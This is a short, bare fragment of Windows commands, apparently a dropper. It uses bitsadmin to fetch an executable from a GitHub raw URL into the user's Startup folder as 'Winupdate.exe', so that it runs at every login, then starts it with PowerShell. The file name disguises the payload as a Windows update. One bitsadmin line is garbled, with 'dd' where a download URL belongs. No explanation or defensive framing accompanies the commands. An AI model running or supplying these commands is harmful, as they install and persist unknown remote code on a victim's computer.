...
bitsadmin /transfer Packages /download /priority foreground dd "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate.exe" 
 
powershell -command "start Winupdate.exe" 
 
 
 
bitsadmin /transfer Packages /download /priority foreground https://github.com/sadjfldsaf/test/raw/main/0813fcdf36338397.exe "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate.exe" 
